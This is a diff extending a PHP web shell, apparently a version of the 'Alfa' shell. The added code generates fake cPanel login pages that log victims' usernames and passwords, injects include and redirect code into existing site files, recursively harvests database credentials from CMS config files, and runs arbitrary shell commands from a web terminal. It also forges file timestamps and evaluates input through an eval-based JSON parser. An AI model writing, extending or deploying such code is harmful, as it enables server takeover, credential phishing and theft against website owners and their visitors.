+				$fake = str_replace($matched_form, $form, $source_page);
+				if(@!is_dir($fake_root)){
+					@mkdir($fake_root, 0777, true);
+				}
+
+				$cookie_name = "alfa_fakepage_counter" . rand(9999,99999);
+
+				$post_user = 'user';
+				$post_pass = 'pass';
+				$resp_code = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
+				if($panel != "cpanel"){
+					$post_user = 'username';
+					$post_pass = 'password';
+					$resp_code = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
+				}
+
+				$cpanel_log = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$post_user.'"];$pass = $_POST["'.$post_pass.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$cookie_name.'"])){@setcookie("'.$cookie_name.'", 0, $cook_time, "/");$_COOKIE["'.$cookie_name.'"]=1;}if((int)$_COOKIE["'.$cookie_name.'"]>'.$count.'){@header("Location: /");exit;}@setcookie("'.$cookie_name.'", ((int)$_COOKIE["'.$cookie_name.'"] + 1), $cook_time, "/");$fp = @fopen("'.$logto.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$resp_code.'exit;}?>';
+
+				@file_put_contents($fake_root.'/log.php', $cpanel_log);
+
+				if($panel == "cpanel"){
+					$fake = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$target.'/$2">', '<img class="main-logo" src="'.$target.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $fake);
+				}
+
+				@file_put_contents($fake_root.'/index.php', $fake);
+
+				$inject_code = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@include("'.$fake_root.'/index.php");exit;}?>';
+				$bind_on_code = '<?php if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';
+
+				@file_put_contents($inject_to, $inject_code . "\n" .@file_get_contents($inject_to));
+				@file_put_contents($bind_on, $bind_on_code . "\n" .@file_get_contents($bind_on));
+
+				echo "success...!";
+			}else{
+				echo "failed...!";
+			}
+		}else{
+			echo("<div style='text-align:center;color:red;'>Cannot open the target...!</div>");
+		}
+	}
+	echo '</div>';
+	alfafooter();
+}
+function alfaarchive_manager(){
+	alfahead();
+	$file = $_POST['alfa2'];
+	if(!file_exists($file)){
+		$file = $GLOBALS['cwd'];
+	}
+	$rand_id = rand(9999, 999999);
+	echo '<div class=header><center><p><div class="txtfont_header">| Archive Manager |</div></p>';
+	echo '<form name="srch" onSubmit="g(\'archive_manager\',null,null,this.file.value,null,null,\'>>\');return false;" method=\'post\'>
+	<div class="txtfont">
+	Archive file: <input size="50" id="target" type="text" name="file" value="'.$file.'">
+	<input type="submit" name="btn" value=" "></div></form></center><br>';
+	if($_POST['alfa5']=='>>'){
+		//echo __pre();
+		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename($file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
+		echo '<div style="padding: 10px;" id="archive_base_'.$rand_id.'">';
+		__alfa_open_archive_file($file, $rand_id);
+		echo '</div>';
+	}
+	echo '</div>';
+	alfafooter();
+}
+function __alfa_open_archive_file($arch, $base_id=0){
+	try{
+		$files = array();
+		$dirs = array();
+		$archive = new PharData($arch);
+		 foreach($archive as $file) {
+			 $file_modify = @date('Y-m-d H:i:s', @filemtime($file->getPathname()));
+		     if($file->isDir()) {
+				 $dirs[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "dir", "modify" => $file_modify);
+		     }else{
+				 $file_size = @filesize($file->getPathname());
+				 $files[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "file",  "modify" => $file_modify, "size" => $file_size);
+			 }
+		 }
+		 function __alfa_open_archive_usort($a, $b){
+			 return strcmp(strtolower($a['name']), strtolower($b['name']))*1;
+		 }
+		 usort($dirs, "__alfa_open_archive_usort");
+		 usort($files, "__alfa_open_archive_usort");
+		 $files = array_merge($dirs, $files);
+		 echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
+		 $icon = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
+		 echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="alfaOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
+		 foreach($files as $file){
+			 $icon = '<img class="archive-icons" src="'.findicon($file['name'],$file['type']).'" width="30" height="30">';
+			 if($file["type"] == "dir"){
+			 	echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="alfaOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
+		 	}else{
+				echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".alfaSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";
+
+			}
+		 }
+		  echo '</table>';
+	}catch(Exception $e){
+		echo("0");
+	}
+}
+function alfaopen_archive_dir(){
+	$dir = $_POST["alfa1"];
+	$base_id = $_POST["alfa2"];
+	__alfa_open_archive_file($dir, $base_id);
+}
+function alfaconfig_grabber(){
+	alfahead();
+	echo '<div class=header><center><p><div class="txtfont_header">| Config Grabber |</div></p>';
+	echo '<form name="srch" onSubmit="g(\'config_grabber\',null,null,this.dir.value,this.ext.value,null,\'>>\');return false;" method=\'post\'>
+	<div class="txtfont">
+	Dir: <input size="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
+	Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
+	<input type="submit" name="btn" value=" "></div></form></center><br>';
+	$dir = $_POST['alfa2'];
+	$ext = $_POST['alfa3'];
+	if($_POST['alfa5']=='>>'){
+		echo __pre();
+		Alfa_ConfigGrabber($dir, $ext);
+	}
+	echo '</div>';
+	alfafooter();
+}
+function Alfa_ConfigGrabber($dir, $ext) {
+	$pattern = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
+	$db_files = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
+	if(@is_readable($dir)){
+		$globFiles = @glob("$dir/*.$ext");
+		$globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
+		$blacklist = array();
+		foreach ($globDirs as $dir) {
+			if(!@is_readable($dir)||@is_link($dir)) continue;
+			@Alfa_ConfigGrabber($dir, $ext);
+		}
+		foreach ($globFiles as $file){
+			$filee = @file_get_contents($file);
+			if(preg_match($pattern, $filee)){
+				echo "<div><span>$file</span> <a style='cursor:pointer;' onclick=\"editor('".$file."','auto','','','','file');\">[ View file ]</a></div>";
+			}
+		}
+	}
+}
 function alfasearcher(){
 alfahead();
 echo '<div class=header><center><p><div class="txtfont_header">| Searcher |</div></p><h3><a href=javascript:void(0) onclick="g(\'searcher\',null,\'file\')">| Find Readable Or Writable Files | </a><a href=javascript:void(0) onclick="g(\'searcher\',null,\'str\')">| Find Files By Name | </a></h3></center>';
@@ -5957,7 +6053,7 @@ $globFiles = @glob("$dir/*.$ext");
 $globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
 $blacklist = array();
 foreach ($globDirs as $dir) {
-if(!@is_readable($dir)) continue;
+if(!@is_readable($dir)||@is_link($dir)) continue;
 @Alfa_Searcher($dir, $ext, $method);
 }
 switch($method){
@@ -5986,7 +6082,7 @@ unset($blacklist);
 }
 }
 function AlfaiFrameCreator($f,$width='100%',$height='600px'){
-return('<iframe src="'.$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
+return('<iframe src="'.__ALFA_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
 }
 class AlfaCURL {
 public $headers;
@@ -5995,14 +6091,14 @@ public $compression;
 public $cookie_file;
 public $proxy;
 public $path;
-public $ssl = false;
+public $ssl = true;
 public $curl_status = true;
 function __construct($cookies=false,$compression='gzip',$proxy=''){
 if(!extension_loaded('curl')){$curl_status = false;return false;}
 $this->headers[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';
 $this->headers[] = 'Connection: Keep-Alive';
 $this->headers[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8';
-$this->user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)';
+$this->user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)';
 $this->path = ALFA_TEMPDIR.'/Alfa_cookies.txt';
 $this->compression=$compression;
 $this->proxy=$proxy;
@@ -6043,7 +6139,7 @@ curl_setopt($process, CURLOPT_POSTFIELDS, $data);
 curl_setopt($process, CURLOPT_POST, 1);
 curl_setopt($process, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
 }
-$return = curl_exec($process);
+$return = @curl_exec($process);
 curl_close($process);
 return $return;
 }
@@ -6055,7 +6151,7 @@ die;
 function getConfigHtml($cms){
 $content = '';
 $cms_array = array("wp" => "WordPress", "vb" => "vBulletin", "whmcs" => "Whmcs", "joomla" => "Joomla", "phpnuke" => "PHPNuke","phpbb"=>"PHPBB","mybb"=>"MyBB","drupal"=>"Drupal","smf"=>"SMF");
-$content .= "<form onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value);return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
+$content .= "<form class='getconfig' onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value,this.getAttribute(\"base_id\"));return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
 foreach($cms_array as $key => $val){
 $content .= "<option value='{$key}' ".($key==$cms?'selected=selected':'').">{$val}</option>";
 }
@@ -6063,30 +6159,254 @@ $content .= "</select> <div class='txtfont'>Path(installed cms/Config): </div> <
 $content .= "</form>";
 return $content;
 }
+if (!function_exists('json_encode')){
+    function json_encode($a=false){
+        if (is_null($a)) return 'null';
+        if ($a === false) return 'false';
+        if ($a === true) return 'true';
+        if (is_scalar($a))
+        {
+            if (is_float($a))
+            {
+                return floatval(str_replace(",", ".", strval($a)));
+            }
+
+            if (is_string($a))
+            {
+                static $jsonReplaces = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
+                return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $a) . '"';
+            }
+            else
+            return $a;
+        }
+        $isList = true;
+        for ($i = 0, reset($a); $i < count($a); $i++, next($a))
+        {
+            if (key($a) !== $i)
+            {
+                $isList = false;
+                break;
+            }
+        }
+        $result = array();
+        if ($isList)
+        {
+            foreach ($a as $v) $result[] = json_encode($v);
+            return '[' . join(',', $result) . ']';
+        }
+        else
+        {
+            foreach ($a as $k => $v) $result[] = json_encode($k).':'.json_encode($v);
+            return '{' . join(',', $result) . '}';
+        }
+    }
+}
+if ( !function_exists('json_decode') ){
+function json_decode($json, $array=true){
+    $comment = false;
+    $out = '$x=';
+    for ($i=0; $i<strlen($json); $i++)
+    {
+        if (!$comment)
+        {
+            if ($json[$i] == '{' || $json[$i] == '['){$out .= ' array(';}
+            else if ($json[$i] == '}' || $json[$i] == ']'){$out .= ')';}
+            else if ($json[$i] == ':'){$out .= '=>';}
+            else {$out .= $json[$i];}
+        }
+        else $out .= $json[$i];
+        if ($json[$i] == '"')    $comment = !$comment;
+    }
+    eval($out . ';');
+    return $x;
+}
+}
+function alfaterminalExec(){
+	$pwd = "pwd";
+	$seperator = ";";
+	if($GLOBALS['sys']!='unix'){
+		$pwd = "cd";
+		$seperator = "&";
+	}
+	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."'".$seperator;}
+	$current_path = '';
+	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['alfa1'], $match)){
+		if(empty($match[1])){
+			$match[1] = $match[2];
+		}
+		$current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd);
+		$current_path = str_replace("\\", "/", $current_path);
+	}
+	$out = alfaEx($cmd.$_POST['alfa1'], true);
+	$out = htmlspecialchars($out);
+	echo json_encode(array("output" => convertBash($out), "path" => $current_path));
+}
+function convertBash($code) {
+    $dictionary = array(
+        '[01;30m' => '<span style="color:black">',
+        '[01;31m' => '<span style="color:red">',
+        '[01;32m' => '<span style="color:green">',
+        '[01;33m' => '<span style="color:yellow">',
+        '[01;34m' => '<span style="color:blue">',
+        '[01;35m' => '<span style="color:purple">',
+        '[01;36m' => '<span style="color:cyan">',
+        '[01;37m' => '<span style="color:white">',
+        '[0m'   => '</span>'
+    );
+    $htmlString = str_replace(array_keys($dictionary), $dictionary, $code);
+    return $htmlString;
+}
+function alfadoActions(){
+	$chdir_fals = false;
+	if(!@chdir($_POST['c'])){
+		$chdir_fals = true;
+		$alfa_canruncmd = _alfa_can_runCommand(true,true);
+	}
+	if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
+	if(isset($_POST['alfa2']))$_POST['alfa2'] = rawurldecode($_POST['alfa2']);
+	$action = $_POST["alfa3"];
+	if($action == "permission"){
+		$perms = 0;
+		$perm = $_POST["alfa2"];
+		for($i=strlen($perm)-1;$i>=0;--$i){
+			$perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
+		}
+		if(@chmod($_POST['alfa1'], $perms)){
+			echo("done");
+		}else{
+			echo("no");
+		}
+		return;
+	}
+	if($action == "rename" || $action == "move"){
+		$alfa1_decoded = $_POST['alfa1'];
+		if($chdir_fals){
+			$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
+		}
+		$_POST['alfa1'] = trim($_POST['alfa1']);
+		$alfa1_escape = addslashes($_POST["alfa1"]);
+		if($_POST["alfa3"] == "rename"){
+			$_POST['alfa2'] = basename($_POST['alfa2']);
+		}
+		if(!empty($_POST['alfa2'])){
+			$cmd_rename = false;
+			if($chdir_fals&&$alfa_canruncmd){
+				if(_alfa_is_writable($_POST['alfa1'])){
+					$cmd_rename = true;
+					$alfa1_escape = addslashes($alfa1_decoded);
+					alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa2'])."'");
+				}
+			}
+			if(!file_exists($_POST['alfa2'])){
+				if(@rename($_POST['alfa1'], $_POST['alfa2'])||$cmd_rename){
+					echo "done";
+				}else{
+					echo "no";
+				}
+			}else{
+				echo "no";
+			}
+		}
+	}elseif($action == "copy"){
+		if(is_dir($_POST["alfa1"])){
+			$dir = str_replace('//', '/', $_POST["alfa1"]);
+			$dir = explode('/', $dir);
+			if(empty($dir[count($dir) - 1])){
+				$name = $dir[count($dir) - 2];
+			}else{
+				$name = $dir[count($dir) - 1];
+			}
+		}else{
+			$name = basename($_POST["alfa1"]);
+		}
+		$dir = dirname($_POST["alfa1"]);
+		if($dir == "."){
+			$dir = $_POST["c"]."/";
+		}
+		if(is_file($_POST["alfa1"])){
+			@copy($_POST["alfa1"], $_POST["alfa2"]);
+			echo("done");
+		}elseif(is_dir($_POST["alfa1"])){
+			if(!is_dir($_POST["alfa2"])){
+				mkdir($_POST["alfa2"], 0755, true);
+			}
+			copy_paste($dir, $name , $_POST["alfa2"] . "/");
+			echo("done");
+		}
+	}elseif($action == "modify"){
+		if( !empty($_POST['alfa1']) ) {
+			$time = strtotime($_POST['alfa1']);
+			if($time){
+				$touched = false;
+				if($chdir_fals&&$alfa_canruncmd){
+					alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa1']))."' '".addslashes($_POST['alfa2'])."'");
+					$touched = true;
+				}
+				if(!@touch($_POST['alfa2'],$time,$time)&&!$touched){
+					echo 'no';
+				}else{
+					echo 'ok';
+				}
+			} else{
+				 echo 'badtime';
+			}
+		}
+	}
+
+}
+function alfaget_flags(){
+	$flags = array();
+	if(function_exists("curl_version")){
+		$curl = new AlfaCURL();
+		$server_addr = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
+		$flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
+		$flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
+		if(strpos($flag2, "geoplugin") != false){
+			$flag = json_decode($flag, true);
+			$flag2 = json_decode($flag2, true);
+			if(!empty($flag['geoplugin_countryCode'])){
+				$flags["server"]["name"] = $flag['geoplugin_countryName'];
+				$flags["server"]["code"] = $flag['geoplugin_countryCode'];
+			}
+			if(!empty($flag2['geoplugin_countryCode'])){
+				$flags["client"]["name"] = $flag2['geoplugin_countryName'];
+				$flags["client"]["code"] = $flag2['geoplugin_countryCode'];
+			}
+		}
+	}
+	echo json_encode($flags);
+}
 function alfaGetConfig(){
 $cms = $_POST['alfa1'];
 $path = trim($_POST['alfa2']);
 $config = array(
 'wp'=>array('file'=>'/wp-config.php',
-'host'=>array("/define\('DB_HOST',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2),
-'dbname'=>array("/define\('DB_NAME',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2),
-'dbuser'=>array("/define\('DB_USER',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2),
-'dbpw'=>array("/define\('DB_PASSWORD',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2),
-'prefix'=>array("/table_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
+'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
+'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_NAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
+'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USER(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
+'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
+'prefix'=>array("/table_prefix[ ]{0,}=[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,};/",1)
 ),
 'drupal'=>array('file'=>'/config.php',
-'host'=>array("/define\('DB_HOSTNAME',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2),
-'dbname'=>array("/define\('DB_DATABASE',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2),
-'dbuser'=>array("/define\('DB_USERNAME',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2),
-'dbpw'=>array("/define\('DB_PASSWORD',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2),
-'prefix'=>array("/define\('DB_PREFIX',(\s+)(?:'|\")(.*?)(?:'|\")\);/",2)
+'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
+'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_DATABASE(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
+'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USERNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
+'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
+'prefix'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PREFIX(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1)
+),
+'drupal2'=>array('file'=>'/sites/default/settings.php',
+'host'=>array("/(?:'|\")host(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
+'dbname'=>array("/(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
+'dbuser'=>array("/(?:'|\")username(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
+'dbpw'=>array("/(?:'|\")password(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
+'prefix'=>array("/(?:'|\")prefix(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1)
 ),
 'vb'=>array('file'=>'/includes/config.php',
-'host'=>array("/config\['MasterServer'\]\['servername'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbuser'=>array("/config\['MasterServer'\]\['username'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbname'=>array("/config\['Database'\]\['dbname'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbpw'=>array("/config\['MasterServer'\]\['password'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'prefix'=>array("/config\['Database'\]\['tableprefix'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
+'host'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")servername(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
+'dbuser'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")username(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
+'dbname'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")dbname(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
+'dbpw'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
+'prefix'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")tableprefix(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3)
 ),
 'phpnuke'=>array('file'=>'/config.php',
 'host'=>array('/dbhost(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
@@ -6131,6 +6451,22 @@ $config = array(
 'prefix'=>array("/config\['database'\]\['table_prefix'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
 )
 );
+if($cms == "drupal"){
+	$file = $config[$cms]['file'];
+	$file=$path.$file;
+	if(@is_file($file)||_alfa_is_dir($file,"-e")){
+	}else{
+		$cms = 'drupal2';
+	}
+}
+if($cms == "vb"){
+	$file = $config[$cms]['file'];
+	$file=$path.$file;
+	if(@is_file($file)||_alfa_is_dir($file,"-e")){
+	}else{
+		$path .= '/core';
+	}
+}
 $data = array();
 $srch_host = $config[$cms]['host'][0];
 $srch_user = $config[$cms]['dbuser'][0];
@@ -6151,6 +6487,11 @@ $file=$path;
 return false;
 }
 $file = __read_file($file);
+if($cms == "drupal2"){
+	$file = preg_replace("/\@code(.*?)\@endcode/s", "", $file);
+}elseif($cms == "vb"){
+	$file = preg_replace("/right of the(.*?)BAD!/s", "", $file);
+}
 if(preg_match($srch_host, $file, $mach)){
 $data['host'] = $mach[$chost];
 }
@@ -6179,7 +6520,7 @@ if(empty($_POST['a']))
 if(isset($default_action) && function_exists('alfa' . $default_action))
 $_POST['a'] = $default_action;
 else
-$_POST['a'] = 'FilesMan';
+$_POST['a'] = 'FilesMan2';//'FilesMan';
 if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
 exit;
@@ -6188,3 +6529,4 @@ exit;
 #skype : sole.sad
 #skype : ehsan.invisible
 */
+?>
